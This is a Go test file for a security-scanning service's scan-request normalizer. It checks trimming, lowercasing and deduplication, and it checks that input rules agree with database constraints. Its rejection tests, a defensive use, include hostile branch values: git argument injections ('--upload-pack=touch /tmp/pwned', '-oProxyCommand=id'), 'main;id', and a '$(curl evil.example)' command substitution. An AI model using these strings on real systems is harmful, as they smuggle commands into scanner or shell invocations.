package scans_test

import (
	"errors"
	"regexp"
	"strings"
	"testing"

	"github.com/aizen299/secure-dev/internal/scanners"
	"github.com/aizen299/secure-dev/internal/scans"
)

func repoTarget() scanners.Target {
	return scanners.Target{Kind: scanners.KindRepository, RepositoryURL: "https://github.com/x/y"}
}

func TestNormalizeAcceptsAMinimalRequest(t *testing.T) {
	got, err := scans.NewScan{ProjectID: "p1", Target: repoTarget()}.Normalize()
	if err != nil {
		t.Fatalf("Normalize: unexpected error: %v", err)
	}
	// An empty selection means "everything that supports this kind", resolved
	// by the worker's registry. It must not be turned into a concrete list
	// here: the API has no knowledge of which adapters exist (§7).
	if got.Scanners != nil {
		t.Errorf("Scanners = %v, want nil", got.Scanners)
	}
}

func TestNormalizeCanonicalisesInput(t *testing.T) {
	repo := "  r1  "
	got, err := scans.NewScan{
		ProjectID:    "  p1  ",
		RepositoryID: &repo,
		Target:       repoTarget(),
		CommitSHA:    "  ABCDEF1234567  ",
		Branch:       "  release/2.0  ",
		Scanners:     []string{"Trivy", " gitleaks ", "trivy"},
	}.Normalize()
	if err != nil {
		t.Fatalf("Normalize: unexpected error: %v", err)
	}

	if got.ProjectID != "p1" {
		t.Errorf("ProjectID = %q, want %q", got.ProjectID, "p1")
	}
	if got.RepositoryID == nil || *got.RepositoryID != "r1" {
		t.Errorf("RepositoryID = %v, want %q", got.RepositoryID, "r1")
	}
	// The commit_sha CHECK constraint accepts lowercase hex only, so the
	// value is lowercased rather than rejected.
	if got.CommitSHA != "abcdef1234567" {
		t.Errorf("CommitSHA = %q, want %q", got.CommitSHA, "abcdef1234567")
	}
	if got.Branch != "release/2.0" {
		t.Errorf("Branch = %q, want %q", got.Branch, "release/2.0")
	}
	// Deduplicated, lowercased, and sorted: the same request must always
	// produce the same stored selection.
	want := []string{"gitleaks", "trivy"}
	if len(got.Scanners) != len(want) {
		t.Fatalf("Scanners = %v, want %v", got.Scanners, want)
	}
	for i := range want {
		if got.Scanners[i] != want[i] {
			t.Fatalf("Scanners = %v, want %v", got.Scanners, want)
		}
	}
}

func TestNormalizeRejectsInvalidInput(t *testing.T) {
	blank := "   "
	tests := []struct {
		name  string
		input scans.NewScan
	}{
		{"no project", scans.NewScan{Target: repoTarget()}},
		{"blank project", scans.NewScan{ProjectID: "  ", Target: repoTarget()}},
		{"no target kind", scans.NewScan{ProjectID: "p1"}},
		{"unknown target kind", scans.NewScan{
			ProjectID: "p1", Target: scanners.Target{Kind: "kubernetes"},
		}},
		{"blank repository id", scans.NewScan{
			ProjectID: "p1", Target: repoTarget(), RepositoryID: &blank,
		}},
		{"short commit sha", scans.NewScan{ProjectID: "p1", Target: repoTarget(), CommitSHA: "abc"}},
		{"non-hex commit sha", scans.NewScan{ProjectID: "p1", Target: repoTarget(), CommitSHA: "zzzzzzz"}},
		{"overlong commit sha", scans.NewScan{
			ProjectID: "p1", Target: repoTarget(), CommitSHA: strings.Repeat("a", 65),
		}},
		{"branch with space", scans.NewScan{ProjectID: "p1", Target: repoTarget(), Branch: "my branch"}},
		{"branch with traversal", scans.NewScan{ProjectID: "p1", Target: repoTarget(), Branch: "a/../b"}},
		{"branch with semicolon", scans.NewScan{ProjectID: "p1", Target: repoTarget(), Branch: "main;id"}},
		{"blank scanner name", scans.NewScan{
			ProjectID: "p1", Target: repoTarget(), Scanners: []string{"  "},
		}},
		{"scanner name with slash", scans.NewScan{
			ProjectID: "p1", Target: repoTarget(), Scanners: []string{"a/b"},
		}},
		{"scanner name with space", scans.NewScan{
			ProjectID: "p1", Target: repoTarget(), Scanners: []string{"tri vy"},
		}},
		{"too many scanners", scans.NewScan{
			ProjectID: "p1", Target: repoTarget(),
			Scanners: make([]string, scans.MaxRequestedScanners+1),
		}},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := tc.input.Normalize(); !errors.Is(err, scans.ErrInvalidScan) {
				t.Fatalf("Normalize: error = %v, want ErrInvalidScan", err)
			}
		})
	}
}

// A branch name reaches a scanner as an argv element. A leading "-" would be
// parsed as a flag, turning a branch string into scanner options.
func TestNormalizeRejectsArgumentInjectionInBranch(t *testing.T) {
	for _, branch := range []string{
		"--upload-pack=touch /tmp/pwned",
		"-oProxyCommand=id",
		"-",
	} {
		t.Run(branch, func(t *testing.T) {
			_, err := scans.NewScan{ProjectID: "p1", Target: repoTarget(), Branch: branch}.Normalize()
			if !errors.Is(err, scans.ErrInvalidScan) {
				t.Fatalf("branch %q was accepted; leading dashes must be rejected", branch)
			}
		})
	}
}

// Rejection messages are logged, so they must not echo attacker-controlled
// values back into the log stream.
func TestNormalizeErrorsDoNotEchoTheBranch(t *testing.T) {
	const hostile = "main$(curl evil.example)"

	_, err := scans.NewScan{ProjectID: "p1", Target: repoTarget(), Branch: hostile}.Normalize()
	if err == nil {
		t.Fatal("expected an error")
	}
	if strings.Contains(err.Error(), hostile) {
		t.Errorf("error echoed the branch value: %q", err)
	}
}

// The Go pattern and the scans_commit_sha_format CHECK constraint in migration
// 0001 must agree, or an accepted value becomes a 500 at insert time.
func TestCommitSHAPatternMatchesTheMigrationConstraint(t *testing.T) {
	// Copied verbatim from migrations/0001_init.up.sql.
	migrationPattern := regexp.MustCompile(`^[0-9a-f]{7,64}$`)

	cases := []string{
		"abcdef1", strings.Repeat("a", 40), strings.Repeat("a", 64),
		"abcdef", strings.Repeat("a", 65), "ABCDEF1", "ghijklm", "abc def",
	}

	for _, c := range cases {
		t.Run(c, func(t *testing.T) {
			normalized, err := scans.NewScan{
				ProjectID: "p1", Target: repoTarget(), CommitSHA: c,
			}.Normalize()
			// Normalize lowercases first, so compare the constraint against
			// the value that would actually be written.
			accepted := err == nil
			if accepted != migrationPattern.MatchString(normalized.CommitSHA) {
				t.Errorf("commit_sha %q: Normalize accepted=%v, constraint accepted=%v",
					c, accepted, migrationPattern.MatchString(normalized.CommitSHA))
			}
		})
	}
}

func TestMaxRequestedScannersMatchesTheMigrationBound(t *testing.T) {
	// migrations/0003_scan_targets.up.sql caps cardinality at 32.
	if scans.MaxRequestedScanners != 32 {
		t.Errorf("MaxRequestedScanners = %d, but the migration constraint caps it at 32",
			scans.MaxRequestedScanners)
	}
}
